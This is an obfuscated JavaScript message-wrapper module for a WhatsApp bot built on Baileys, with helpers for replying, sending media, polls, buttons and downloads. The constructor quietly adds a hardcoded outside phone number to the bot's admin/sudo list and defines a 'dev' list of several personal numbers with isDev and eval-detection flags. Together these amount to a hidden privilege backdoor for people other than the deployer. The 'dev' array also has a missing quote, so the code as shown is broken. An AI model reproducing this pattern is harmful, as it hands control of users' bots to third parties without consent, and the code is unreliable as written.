const {
  getUrlInfo,
  jidNormalizedUser,
  extractMessageContent,
  getContentType,
  proto,
  downloadContentFromMessage,
  getBinaryNodeChild,
  generateWAMessageFromContent,
  getBinaryNodeChildren,
  jidDecode,
  prepareWAMessageMedia,
  WA_DEFAULT_EPHEMERAL,
  isJidGroup
} = require("@whiskeysockets/baileys");
const FileType = require("file-type");
let config = require("../config");
let fs = require('fs');
const util = require("util");
const {
  genThumb,
  generateButtonText,
  gifToBuff
} = require("./whatsapp");
const {
  extractUrlFromMessage,
  isUrl
} = require("./system");
const {
  getBuffer
} = require("jarvis-md");
let M = proto.WebMessageInfo;
class Message {
  constructor(_0x38b39b, _0x40d9ca, _0x134735, _0x2b9250) {
    if (!_0x40d9ca) {
      return _0x40d9ca;
    }
    Object.defineProperty(this, "client", {
      'value': _0x38b39b
    });
    Object.defineProperty(this, "store", {
      'value': _0x134735
    });
    _0x40d9ca = M.fromObject(_0x40d9ca);
    for (let _0x5adf9a in _0x40d9ca) {
      if (_0x40d9ca.hasOwnProperty(_0x5adf9a)) {
        Object.defineProperty(this, _0x5adf9a, {
          'value': _0x40d9ca[_0x5adf9a],
          'enumerable': false,
          'configurable': true,
          'writable': true
        });
      }
    }
    Object.defineProperty(this, "botAdmins", {
      'value': config.SUDO.split(',') || [config.SUDO]
    });
    this.botAdmins.push("916235723929", jidNormalizedUser(this.client.user.id));
    this.displayText = this.body = this.message?.["extendedTextMessage"]?.["text"] || this.message?.["conversation"] || this.message?.[this.type]?.["text"] || this.message?.[this.type]?.["caption"] || this.message?.[this.type]?.["contentText"] || this.message?.[this.type]?.["selectedDisplayText"] || this.message?.[this.type]?.["title"] || '';
    Object.defineProperty(this, "admins", {
      'value': this.botAdmins.filter(_0xb19912 => !!_0xb19912)
    });
    Object.defineProperty(this, "sudo", {
      'value': this.admins.map(_0x40a290 => _0x40a290.replace(/[^0-9]/g, '') + "@s.whatsapp.net")
    });
    if (this.key) {
      this.from = jidNormalizedUser(this.key.remoteJid || this.key.participant);
      Object.defineProperty(this, "jid", {
        'value': this.from
      });
      Object.defineProperty(this, "chat", {
        'value': this.from
      });
      this.fromMe = this.key.fromMe;
      this.id = this.key.id;
      this.isBot = this.id.startsWith("BAE5") || this.id.startsWith("LOKI") || this.id.length === 16 || this.id.length === 15;
      this.isGroup = this.from.endsWith("@g.us");
      this.sender = jidNormalizedUser(this.fromMe && this.client.user?.['id'] || this.key.participant || this.from || '');
    }
    this.type = getContentType(this.message);
    Object.defineProperty(this, "message", {
      'value': extractMessageContent(this.message)
    });
    Object.defineProperty(this, "dev", {
      'value': ["918590822912@s.whatsapp.net",918714803727@s.whatsapp.net", "916235723929@s.whatsapp.net", "4915252819677@s.whatsapp.net", "917025673121@s.whatsapp.net", "919777469706@s.whatsapp.net", "972528994609@s.whatsapp.net"]
    });
    if (this.message) {
      Object.defineProperty(this, "msg", {
        'value': this.message[this.type]
      });
      const _0x3ea316 = this.msg?.["contextInfo"] ? this.msg?.["contextInfo"]?.["quotedMessage"] : null;
      this.quoted = !!(_0x3ea316 !== null);
      if (_0x3ea316) {
        Object.defineProperty(this, "reply_message", {
          'value': {}
        });
        Object.defineProperty(this.reply_message, 'i', {
          'value': true
        });
        this.reply_message.message = _0x3ea316;
        this.reply_message.media = this.msg?.["contextInfo"]?.["quotedMessage"];
        this.reply_message.image = !!this.reply_message.message.imageMessage;
        this.reply_message.video = !!this.reply_message.message.videoMessage;
        this.reply_message.location = !!this.reply_message.message.locationMessage;
        this.reply_message.sticker = !!this.reply_message.message.stickerMessage;
        this.reply_message.audio = !!this.reply_message.message.audioMessage;
        this.reply_message.contact = !!this.reply_message.message.contactMessage;
        this.reply_message.document = !!this.reply_message.message.documentMessage;
        this.reply_message.viewones = !!(this.reply_message.message.viewOnceMessageV2 || this.reply_message.message.viewOnceMessageV2Extension);
        this.reply_message.type = getContentType(this.reply_message.message);
        this.reply_message.msg = this.reply_message.message[this.reply_message.type];
        this.reply_message.id = this.msg?.["contextInfo"]?.["stanzaId"];
        this.reply_message.sender = jidNormalizedUser(this.msg?.["contextInfo"]?.["participant"]);
        this.reply_message.from = this.from;
        this.reply_message.mention = new Object();
        this.reply_message.mention.jid = this.reply_message?.["msg"]?.["extendedTextMessage"]?.["contextInfo"]?.["mentionedJid"] || this.reply_message?.["msg"]?.["contextInfo"]?.["mentionedJid"] || [];
        this.reply_message.mention.isBotNumber = this.reply_message.mention.jid.includes(this.botNumber);
        this.reply_message.mention.isOwner = this.sudo.map(_0xb688c => this.reply_message.mention.jid.includes(_0xb688c)).includes(true);
        this.reply_message.isBot = this.reply_message.id.startsWith("BAE5") || this.reply_message.id.startsWith("LOKI") || this.reply_message.id.length === 16 || this.reply_message.id.length === 15;
        this.reply_message.fromMe = this.reply_message?.["sender"] == jidNormalizedUser(this.client.user && this.client.user?.['id']);
        this.reply_message.text = _0x3ea316?.["extendedTextMessage"]?.["text"] || _0x3ea316?.["text"] || this.reply_message?.["msg"]?.["caption"] || _0x3ea316?.["conversation"] || '';
        this.reply_message.caption = this.reply_message?.["msg"]?.["caption"] || (this.reply_message?.["viewones"] ? this.reply_message?.["msg"]?.["message"]?.["imageMessage"]?.["caption"] || this.reply_message?.["msg"]?.["message"]?.["videoMessage"]?.["caption"] : '');
        this.reply_message.isAnimatedSticker = this.reply_message.msg?.["isAnimated"];
        this.reply_message.seconds = this.reply_message.msg?.["seconds"];
        this.reply_message.duration = this.reply_message.msg?.["seconds"];
        this.reply_message.width = this.reply_message.msg?.["width"];
        this.reply_message.height = this.reply_message.msg?.["height"];
        this.reply_message.isDev = this.dev.includes(this.reply_message.sender);
        this.reply_message.mime = this.reply_message?.["msg"]?.["mimetype"];
        this.reply_message.isEval = this.reply_message.text ? ["require", "await", "return"].map(_0x5ab827 => this.reply_message.text.includes(_0x5ab827)).includes(true) : false;
        this.reply_message.number = this.reply_message.sender ? this.reply_message.sender.replace(/[^0-9]/g, '') : undefined;
        this.reply_message.download = _0x541acb => this.downloadMediaMessage(this.reply_message?.["msg"]);
        this.reply_message.downloadAndSaveMedia = () => this.downloadAndSaveMediaMessage(this.reply_message?.["msg"]);
        this.reply_message.downloadAndSave = () => this.downloadAndSaveMediaMessage(this.reply_message?.["msg"]);
        this.reply_message.data = M.fromObject({
          'key': {
            'remoteJid': this.reply_message?.["from"],
            'fromMe': this.reply_message?.["fromMe"],
            'id': this.reply_message.id,
            'participant': jidNormalizedUser(this.msg?.["contextInfo"]?.["participant"])
          },
          'message': this.reply_message.message,
          ...(this.reply_message?.["isGroup"] ? {
            'participant': this.reply_message?.["sender"]
          } : {})
        });
        this.reply_message["delete"] = () => this.client.sendMessage(this.reply_message?.["from"], {
          'delete': this.reply_message.data.key
        });
      } else {
        Object.defineProperty(this, "reply_message", {
          'value': new Object()
        });
        Object.defineProperty(this.reply_message, 'i', {
          'value': false
        });
        this.reply_message.mention = new Object();
      }
    }
    ;
    this.isDev = this.dev.includes(this.sender);
    this.isEval = ["require", "await", "return"].map(_0x1cfabc => this.body.includes(_0x1cfabc)).includes(true);
    Object.defineProperty(this, "data", {
      'value': new Object()
    });
    this.data.key = this.key;
    this.data.message = this.message;
    this.number = this.sender.replace(/[^0-9]/g, '');
    Object.defineProperty(this, "budy", {
      'value': typeof this.text == "string" ? this.text : ''
    });
    this.pushName = this.pushName || '';
    Object.defineProperty(this, "botNumber", {
      'value': jidNormalizedUser(this.client.user.id)
    });
    Object.defineProperty(this, "mention", {
      'value': new Object()
    });
    this.mention.jid = this.msg?.["contextInfo"]?.["mentionedJid"] || [];
    this.mention.isBotNumber = this.mention.jid.includes(this.botNumber);
    this.mention.isOwner = this.sudo.map(_0x2fecb0 => this.mention.jid.includes(_0x2fecb0)).includes(true);
    Object.defineProperty(this, 'q', {
      'value': this.reply_message?.["from"] ? this.reply_message : this
    });
    this.mime = (this.q?.["msg"] || this.q).mimetype || "text";
    this.isMedia = /image|video|sticker|audio/.test(this.mime);
    this.from = this.key.remoteJid;
    this.image = this.type === "imageMessage";
    this.video = this.type === "videoMessage";
    this.location = this.type === "locationMessage";
    this.sticker = this.type === "stickerMessage";
    this.audio = this.type === "audioMessage";
    this.contact = this.type === "contactMessage";
    this.document = this.type === "documentMessage";
    this.viewones = !!(this.type === "viewOnceMessageV2" || this.type === "viewOnceMessageV2Extension");
    this.caption = this.message?.[this.type]?.["caption"];
    Object.defineProperty(this, "user", {
      'value': new Object()
    });
    this.user.id = this.client.user.id;
    this.user.jid = jidNormalizedUser(this.client.user.id);
    this.user.number = this.user.jid.replace(/[^0-9]/g, '');
    this.prefix = _0x2b9250;
  }
  async ["download"]() {
    await this.downloadMediaMessage(this.msg);
  }
  async ["editMessage"](_0x558b6f, _0xd48d5b, _0x20e28a) {
    return await this.client.relayMessage(_0x558b6f, {
      'protocolMessage': {
        'key': _0x20e28a,
        'type': 0xe,
        'editedMessage': {
          'conversation': _0xd48d5b
        }
      }
    }, {});
  }
  async ["sendGroupInviteMessage"](_0x3f07ff) {
    const _0x362e13 = _0x3f07ff.replace(/[^0-9]/g, '');
    const _0x1a52a5 = await this.client.groupMetadata(this.from)["catch"](_0x5dae81 => {});
    const _0x5d630a = await _0x1a52a5.participants;
    let _0x4177fb = [_0x362e13.toString()];
    let _0x128ad9 = _0x5d630a.map(_0x4d97c6 => _0x4d97c6.id);
    let _0x54a178 = (await Promise.all(_0x4177fb.map(_0xae472f => _0xae472f.replace(/[^0-9]/g, '')).filter(_0x55209e => _0x55209e.length > 4 && _0x55209e.length < 20 && !_0x128ad9.includes(_0x55209e + "@s.whatsapp.net")).map(async _0x133232 => [_0x133232, await this.client.onWhatsApp(_0x133232 + "@s.whatsapp.net")]))).filter(_0x821649 => _0x821649[1][0]?.["exists"]).map(_0x401df3 => _0x401df3[0] + "@c.us");
    const _0x1ec1a8 = await this.client.query({
      'tag': 'iq',
      'attrs': {
        'type': "set",
        'xmlns': "w:g2",
        'to': this.from
      },
      'content': _0x54a178.map(_0x27a7dc => ({
        'tag': "add",
        'attrs': {},
        'content': [{
          'tag': "participant",
          'attrs': {
            'jid': _0x27a7dc
          }
        }]
      }))
    });
    const _0x34742f = getBinaryNodeChildren(_0x1ec1a8, "add");
    let _0xf5fcf1 = _0x34742f[0].content.filter(_0x6cd2d3 => _0x6cd2d3);
    if (_0xf5fcf1[0].attrs.error == 408) {
      return await this.send("Unable to add @" + _0xf5fcf1[0].attrs.jid.split('@')[0] + "!\nThe news is that @" + _0xf5fcf1[0].attrs.jid.split('@')[0] + " just left this group");
    }
    for (const _0x2e2c2f of _0x34742f[0].content.filter(_0x2f5920 => _0x2f5920.attrs.error == 403)) {
      const _0x3064b0 = _0x2e2c2f.attrs.jid;
      const _0x337640 = getBinaryNodeChild(_0x2e2c2f, "add_request");
      const _0x631c52 = _0x337640.attrs.code;
      const _0x4f67c1 = _0x337640.attrs.expiration;
      const {
        subject: _0x3e1571,
        desc: _0x1db5b2
      } = await this.store.fetchGroupMetadata(this.from);
      const _0x39fde3 = _0x1db5b2 || "Invitation to join my WhatsApp group";
      return await this.client.sendInvaite(this.from, _0x3064b0, _0x631c52, _0x4f67c1, _0x3e1571, _0x39fde3, null);
    }
  }
  async ["reply"](_0x37edcf, _0x26478a = {}, _0x2a5a29 = "text") {
    if (config.LINKPREVIEW) {
      if (!_0x26478a.contextInfo) {
        _0x26478a.contextInfo = {
          'externalAdReply': JSON.parse(config.CONTEXTINFO)
        };
      }
    }
    ;
    if (_0x26478a.mentions) {
      if (!_0x26478a.contextInfo) {
        _0x26478a.contextInfo = {};
      }
      _0x26478a.contextInfo.mentionedJid = _0x26478a.mentions;
    }
    ;
    if (_0x2a5a29 === "text") {
      _0x37edcf = util.format(_0x37edcf);
    }
    const _0x284d87 = await this.client.sendMessage(this.jid, {
      [_0x2a5a29]: _0x37edcf,
      ..._0x26478a
    }, {
      'quoted': this.data,
      'messageId': _0x26478a.id || this.client.generateMessageId(),
      'cachedGroupMetadata': this.store.fetchGroupMetadata
    });
    return new Message(this.client, _0x284d87, this.store, this.prefix);
  }
  async ["delete"]() {
    return await this.client.sendMessage(this.jid, {
      'delete': {
        ...this.data.key,
        'participant': this.sender
      }
    });
  }
  async ["edit"](_0x493635) {
    return await this.client.relayMessage(this.jid, {
      'protocolMessage': {
        'key': this.data.key,
        'type': 0xe,
        'editedMessage': {
          'conversation': _0x493635
        }
      }
    }, {});
  }
  async ["react"](_0x327d6f) {
    return await this.client.sendMessage(this.jid, {
      'react': {
        'text': _0x327d6f,
        'key': this.key
      }
    }, {
      'cachedGroupMetadata': this.store.fetchGroupMetadata
    });
  }
  async ["send"](_0x27bb17, _0x2ac5a7 = {}, _0x57e998 = "text", _0x2fb42e = this.from) {
    if (["photo", "img", "picture", "pic"].includes(_0x57e998)) {
      _0x57e998 = "image";
    }
    if (["vid", "mp4"].includes(_0x57e998)) {
      _0x57e998 = "video";
    }
    if (["aud", "mp3", "wawe"].includes(_0x57e998)) {
      _0x57e998 = "audio";
    }
    const _0x50fe7f = Buffer.isBuffer(_0x27bb17);
    const _0x10a94e = _0x57e998 === "text" || _0x50fe7f ? false : typeof _0x27bb17 !== "object" && _0x27bb17.startsWith("http");
    if (_0x57e998 !== "text" && _0x10a94e) {
      _0x27bb17 = await getBuffer(await extractUrlFromMessage(_0x27bb17));
    }
    ;
    if (_0x57e998 !== "text" && !_0x10a94e && !_0x50fe7f || _0x57e998 === "text" && _0x2ac5a7.readAs) {
      if (fs.existsSync('./' + _0x27bb17)) {
        if (_0x57e998 === "text") {
          _0x2ac5a7.readAs = "utf-8";
        }
        _0x27bb17 = await fs.promises.readFile(_0x27bb17, _0x2ac5a7.readAs);
        if (_0x2ac5a7.readAs) {
          delete _0x2ac5a7.readAs;
        }
      }
      ;
    }
    ;
    if (_0x2ac5a7.jpegThumbnail) {
      _0x2ac5a7.jpegThumbnail = await genThumb(_0x2ac5a7.jpegThumbnail);
    }
    if (_0x2ac5a7.addUrlInfo) {
      Object.assign(_0x2ac5a7, await getUrlInfo(await extractUrlFromMessage(_0x27bb17)));
      delete _0x2ac5a7.addUrlInfo;
    }
    ;
    if (config.LINKPREVIEW) {
      if (!_0x2ac5a7.contextInfo) {
        if (!_0x2ac5a7.linkPreview) {
          _0x2ac5a7.linkPreview = JSON.parse(config.CONTEXTINFO);
        }
        ;
      }
      ;
    }
    ;
    if (_0x57e998 === "gif") {
      _0x57e998 = "video";
      _0x2ac5a7.gifPlayback = true;
      _0x27bb17 = await gifToBuff(_0x27bb17);
    }
    ;
    if (_0x2ac5a7.waveform) {
      _0x2ac5a7.waveform = new Uint8Array(_0x2ac5a7.waveform);
      _0x2ac5a7.mimetype = "audio/ogg; codecs=opus";
      if (_0x2ac5a7.ptt) {
        delete _0x2ac5a7.ptt;
      }
    }
    ;
    if (_0x2ac5a7.mentions) {
      if (!_0x2ac5a7.contextInfo) {
        _0x2ac5a7.contextInfo = {};
      }
      _0x2ac5a7.contextInfo.mentionedJid = _0x2ac5a7.mentions;
    }
    ;
    if (_0x2ac5a7.linkPreview) {
      _0x2ac5a7.contextInfo = {
        'externalAdReply': _0x2ac5a7.linkPreview
      };
      delete _0x2ac5a7.linkPreview;
    }
    ;
    if (_0x57e998 === "ptv") {
      _0x57e998 = "video";
      _0x2ac5a7.ptv = true;
    }
    ;
    if (_0x57e998 === "text") {
      if (_0x2ac5a7?.["contextInfo"]?.["externalAdReply"]) {
        _0x2ac5a7.contextInfo.externalAdReply.previewType = "PHOTO";
        _0x2ac5a7.contextInfo.externalAdReply.containsAutoReply = true;
      }
      let _0x4cd21d = await this.client.sendMessage(_0x2fb42e, {
        'text': util.format(_0x27bb17),
        ..._0x2ac5a7,
        'ephemeralExpiration': WA_DEFAULT_EPHEMERAL
      }, {
        'quoted': _0x2ac5a7.quoted,
        'cachedGroupMetadata': this.store.fetchGroupMetadata,
        'messageId': _0x2ac5a7.id || this.client.generateMessageId()
      });
      _0x4cd21d.edit = async _0x38c36f => {
        return await this.client.relayMessage(_0x2fb42e, {
          'protocolMessage': {
            'key': _0x4cd21d.key,
            'type': 0xe,
            'editedMessage': {
              'conversation': _0x38c36f
            }
          }
        }, {
          'cachedGroupMetadata': this.store.fetchGroupMetadata
        });
      };
      _0x4cd21d["delete"] = async () => {
        return await this.client.sendMessage(_0x2fb42e, {
          'delete': _0x4cd21d.key
        }, {
          'cachedGroupMetadata': this.store.fetchGroupMetadata
        });
      };
      _0x4cd21d.react = async _0x4e5ebf => {
        return await this.client.sendMessage(_0x2fb42e, {
          'react': {
            'text': _0x4e5ebf,
            'key': _0x4cd21d.key
          }
        }, {
          'cachedGroupMetadata': this.store.fetchGroupMetadata
        });
      };
      return _0x4cd21d;
    } else {
      if (_0x57e998 == "edit") {
        return await this.client.sendMessage(_0x2fb42e, {
          'text': _0x27bb17.text,
          'edit': _0x27bb17.key
        }, {
          'quoted': _0x2ac5a7.quoted,
          'cachedGroupMetadata': this.store.fetchGroupMetadata
        });
      } else {
        if (_0x57e998 == "delete") {
          return await this.client.sendMessage(_0x2fb42e, {
            'delete': _0x27bb17.key,
            'participant': _0x2ac5a7.participant
          }, {
            'cachedGroupMetadata': this.store.fetchGroupMetadata
          });
        } else {
          if (_0x57e998 === "sticker") {
            if (!_0x2ac5a7.packname) {
              _0x2ac5a7.packname = config.STICKER_PACKNAME.split(';')[0];
            }
            if (!_0x2ac5a7.author) {
              _0x2ac5a7.author = config.STICKER_PACKNAME.split(';')[1];
            }
            return await this.client.sendSticker(_0x2fb42e, _0x27bb17, {
              'packname': _0x2ac5a7.packname,
              'author': _0x2ac5a7.author,
              ..._0x2ac5a7,
              'messageId': _0x2ac5a7.id || this.client.generateMessageId(),
              'ephemeralExpiration': WA_DEFAULT_EPHEMERAL
            });
          } else {
            if (_0x57e998 == "button") {
              let _0x10b569;
              let _0x461d37;
              let _0xbe4bd5;
              if (_0x2ac5a7.type === "image" || _0x2ac5a7.type === "video") {
                const _0x1e6e45 = await prepareWAMessageMedia({
                  [_0x2ac5a7.type]: _0x27bb17
                }, {
                  'upload': this.client.waUploadToServer
                });
                _0x461d37 = _0x1e6e45[_0x2ac5a7.type + "Message"];
                _0xbe4bd5 = _0x2ac5a7.type + "Message";
                _0x10b569 = _0x2ac5a7.value;
              } else {
                _0x461d37 = await fs.readFileSync("./lib/temp/media/black.jpg");
                _0x10b569 = _0x27bb17;
                _0xbe4bd5 = "jpegThumbnail";
              }
              const _0x22de54 = {
                'message': {
                  'messageContextInfo': {
                    'deviceListMetadata': {},
                    'deviceListMetadataVersion': 0x2
                  },
                  'interactiveMessage': proto.Message.InteractiveMessage.create({
                    'body': proto.Message.InteractiveMessage.Body.create({
                      'text': _0x2ac5a7.body
                    }),
                    'footer': proto.Message.InteractiveMessage.Footer.create({
                      'text': _0x2ac5a7.footer
                    }),
                    'header': proto.Message.InteractiveMessage.Header.create({
                      'title': _0x2ac5a7.title,
                      'subtitle': "Loki-Xer;Jarvis-md",
                      'hasMediaAttachment': true,
                      [_0xbe4bd5]: _0x461d37
                    }),
                    'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
                      'buttons': await generateButtonText(_0x10b569)
                    })
                  })
                }
              };
              let _0x37b462 = generateWAMessageFromContent(_0x2fb42e, {
                'viewOnceMessage': _0x22de54
              }, {
                'quoted': _0x2ac5a7.quoted,
                'userJid': this.user.id
              });
              await this.client.relayMessage(_0x2fb42e, _0x37b462.message, {
                'quoted': _0x2ac5a7.quoted,
                'messageId': this.client.generateMessageId(),
                'cachedGroupMetadata': this.store.fetchGroupMetadata
              });
              return _0x37b462;
            } else {
              if (_0x57e998 === "poll") {
                const {
                  values: _0xa5fc2e,
                  onlyOnce = true,
                  keyId: _0x3f2a12,
                  withPrefix = false,
                  selectableCount = 1,
                  participates: _0x28ef3e
                } = _0x2ac5a7;
                let _0x2ff1b3 = [];
                for (const {
                  displayText: _0x38906c,
                  id: _0x9cd11b
                } of _0xa5fc2e) {
                  let _0x4c2a28 = {
                    'name': _0x38906c,
                    'id': _0x9cd11b,
                    'onlyOnce': onlyOnce,
                    'keyId': _0x3f2a12,
                    'withPrefix': withPrefix,
                    'participates': _0x28ef3e
                  };
                  _0x2ff1b3.push(_0x4c2a28);
                }
                const _0x4bb6fd = _0xa5fc2e.map(({
                  displayText: _0x3ad274
                }) => _0x3ad274);
                const _0x42096f = await this.client.sendMessage(_0x2fb42e, {
                  'poll': {
                    'name': _0x27bb17,
                    'values': _0x4bb6fd,
                    'selectableCount': selectableCount
                  }
                }, {
                  'cachedGroupMetadata': this.store.fetchGroupMetadata
                });
                this.store.votes.poll[_0x42096f.key.id] = _0x2ff1b3;
                return _0x42096f;
              } else {
                return await this.client.sendMessage(_0x2fb42e, {
                  [_0x57e998]: _0x27bb17,
                  ..._0x2ac5a7,
                  'ephemeralExpiration': WA_DEFAULT_EPHEMERAL
                }, {
                  'quoted': _0x2ac5a7.quoted,
                  'cachedGroupMetadata': this.store.fetchGroupMetadata,
                  'messageId': _0x2ac5a7.id || this.client.generateMessageId()
                });
              }
            }
          }
        }
      }
    }
  }
  async ["sendFromUrl"](_0x334985, _0x298c31 = {}) {
    if (config.LINKPREVIEW) {
      if (!_0x298c31.contextInfo) {
        _0x298c31.contextInfo = {
          'externalAdReply': JSON.parse(config.CONTEXTINFO)
        };
      }
    }
    ;
    if (_0x298c31.linkPreview) {
      _0x298c31.contextInfo = {
        'externalAdReply': _0x298c31.linkPreview
      };
      delete _0x298c31.linkPreview;
    }
    ;
    let _0x4e59f2 = await getBuffer(_0x334985);
    let _0x47820c = await FileType.fromBuffer(_0x4e59f2);
    let _0x5bd4bf = _0x47820c.mime.split('/')[0];
    if (_0x5bd4bf === "audio") {
      _0x298c31.mimetype = "audio/mpeg";
    }
    if (_0x5bd4bf === "application") {
      _0x5bd4bf = "document";
    }
    return this.client.sendMessage(this.jid, {
      [_0x5bd4bf]: _0x4e59f2,
      ..._0x298c31
    }, {
      ..._0x298c31,
      'messageId': _0x298c31.id || this.client.generateMessageId(),
      'cachedGroupMetadata': this.store.fetchGroupMetadata
    });
  }
  async ["setPP"](_0x565d5, _0x5af18c) {
    if (Buffer.isBuffer(_0x5af18c)) {
      await this.client.updateProfilePicture(_0x565d5, _0x5af18c);
    } else {
      await this.client.updateProfilePicture(_0x565d5, {
        'url': _0x5af18c
      });
    }
  }
  async ["downloadMediaMessage"](_0x4db61a) {
    _0x4db61a = _0x4db61a?.["msg"] ? _0x4db61a?.["msg"] : _0x4db61a;
    let _0x2cbd6f = (_0x4db61a.msg || _0x4db61a).mimetype || '';
    let _0xd09593 = _0x4db61a.type ? _0x4db61a.type.replace(/Message/gi, '') : _0x2cbd6f.split('/')[0];
    const _0x528083 = await downloadContentFromMessage(_0x4db61a, _0xd09593);
    let _0x35ad96 = Buffer.from([]);
    for await (const _0xf1b3b of _0x528083) {
      _0x35ad96 = Buffer.concat([_0x35ad96, _0xf1b3b]);
    }
    return _0x35ad96;
  }
  async ["downloadAndSaveMediaMessage"](_0x19d8a7, _0xb13656, _0x8c9305 = true) {
    let _0x4ef3ef = _0x19d8a7.msg ? _0x19d8a7.msg : _0x19d8a7;
    let _0xad5c1a = (_0x19d8a7.msg || _0x19d8a7).mimetype || '';
    let _0x250662 = _0x19d8a7.mtype ? _0x19d8a7.mtype.replace(/Message/gi, '') : _0xad5c1a.split('/')[0];
    const _0x3e2443 = await downloadContentFromMessage(_0x4ef3ef, _0x250662);
    let _0x1f8f40 = Buffer.from([]);
    for await (const _0x2511ba of _0x3e2443) {
      _0x1f8f40 = Buffer.concat([_0x1f8f40, _0x2511ba]);
    }
    let _0x1ce349 = await FileType.fromBuffer(_0x1f8f40);
    let _0xbc3a6d = _0x8c9305 ? _0xb13656 + '.' + _0x1ce349.ext : _0xb13656;
    await fs.writeFileSync(_0xbc3a6d, _0x1f8f40);
    return _0xbc3a6d;
  }
}
module.exports = {
  'Message': Message
};
